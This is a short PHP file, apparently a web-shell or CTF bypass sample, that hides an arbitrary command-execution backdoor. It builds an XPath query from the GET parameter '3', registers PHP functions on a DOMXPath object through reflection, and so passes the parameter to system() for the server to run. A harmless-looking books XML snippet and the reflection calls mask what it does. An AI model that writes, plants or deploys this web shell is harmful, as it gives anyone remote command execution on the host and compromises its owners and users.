<?php
// dom and xml needed, install php-xml and leave php.ini as default.
// Author:LemonPrefect
$cmd = $_GET[3];
$_REQUEST[1] = "//book[php:functionString('system', '$cmd') = 'PHP']";
$_REQUEST[2] = ["php", "http://php.net/xpath"];
$xml = <<< XML
<?xml version="1.0" encoding="UTF-8"?>
<books>
    <book>
        <title>We are the champions</title>
        <author>LemonPrefect</author>
        <author>H3h3QAQ</author>
    </book>
</books>
XML;
​
$doc = new DOMDocument;
$doc->loadXML($xml);
$clazz = (new ReflectionClass("DOMXPath"));
$instance = $clazz->newInstance($doc);
$clazz->getMethod("registerNamespace")->getClosure($instance)->__invoke(...$_REQUEST[2]);
$clazz->getMethod("registerPHPFunctions")->invoke($instance);
$clazz->getMethod("query")->getClosure($instance)->__invoke($_REQUEST[1]);
